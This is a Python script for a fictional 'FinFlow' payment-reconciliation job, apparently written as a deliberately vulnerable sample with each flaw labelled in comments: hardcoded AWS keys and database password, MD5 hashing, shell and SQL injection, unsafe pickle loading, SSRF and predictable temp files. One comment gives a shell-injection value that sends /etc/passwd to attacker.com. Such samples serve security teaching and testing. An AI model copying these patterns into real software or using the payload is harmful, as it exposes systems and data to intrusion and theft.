#!/usr/bin/env python3
"""
FinFlow — Transaction processing and reporting scripts.
Runs nightly to reconcile payments and generate reports.
"""

import os
import subprocess
import pickle
import sqlite3
import hashlib
import requests

# Hardcoded AWS credentials — should be in IAM roles or environment variables
AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7FINFLOW1'
AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYFINFLOWKEY'
AWS_REGION = 'eu-west-1'
S3_BUCKET = 'finflow-prod-reports'

# Hardcoded database password
DB_CONNECTION = 'postgresql://finflow_admin:Sup3rS3cr3t!@finflow-prod.rds.amazonaws.com/finflow'

# Weak hashing — MD5 for financial record integrity
def hash_transaction(tx_data: str) -> str:
    return hashlib.md5(tx_data.encode()).hexdigest()

# Shell injection — user-controlled filename passed to subprocess
def export_report(report_name: str, output_dir: str = '/tmp/reports') -> None:
    # Attacker can inject: report_name = "report; curl attacker.com -d $(cat /etc/passwd)"
    cmd = f"cp /tmp/finflow_data.csv {output_dir}/{report_name}.csv"
    subprocess.call(cmd, shell=True)
    print(f"Report exported: {output_dir}/{report_name}.csv")

# Insecure deserialisation — pickle with untrusted data
def load_cached_report(cache_file: str):
    with open(cache_file, 'rb') as f:
        # pickle.load() on untrusted input allows arbitrary code execution
        data = pickle.load(f)
    return data

def save_cached_report(data, cache_file: str):
    with open(cache_file, 'wb') as f:
        pickle.dump(data, f)

# SQL injection in reporting query
def get_user_report(db_conn, username: str):
    cursor = db_conn.cursor()
    # Direct string interpolation — injectable
    query = f"SELECT * FROM transactions WHERE from_user = '{username}' OR to_user = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()

# SSRF — user-controlled URL fetched server-side
def fetch_exchange_rates(provider_url: str) -> dict:
    # No URL validation — could be used to hit internal services
    response = requests.get(provider_url, timeout=30)
    return response.json()

# Insecure temp file — predictable path, no mkstemp
def write_temp_data(data: str) -> str:
    temp_path = f"/tmp/finflow_{os.getpid()}.tmp"
    with open(temp_path, 'w') as f:
        f.write(data)
    return temp_path

# Uploading to S3 with hardcoded creds
def upload_to_s3(file_path: str, s3_key: str) -> None:
    import boto3
    session = boto3.Session(
        aws_access_key_id=AWS_ACCESS_KEY_ID,
        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
        region_name=AWS_REGION
    )
    s3 = session.client('s3')
    s3.upload_file(file_path, S3_BUCKET, s3_key)
    print(f"Uploaded {file_path} to s3://{S3_BUCKET}/{s3_key}")

if __name__ == '__main__':
    print(f"Connecting to: {DB_CONNECTION}")  # Logs DB password to stdout

    # Load cached data using insecure pickle
    try:
        cached = load_cached_report('/tmp/finflow_cache.pkl')
        print(f"Loaded cache: {cached}")
    except FileNotFoundError:
        pass

    # Fetch exchange rates from hardcoded (but user-influenced) URL
    rates = fetch_exchange_rates(os.environ.get('RATES_URL', 'http://api.exchangerate.host/latest'))
    print(f"Exchange rates: {rates}")

    # Export report — vulnerable to shell injection
    report_name = os.environ.get('REPORT_NAME', 'daily_report')
    export_report(report_name)
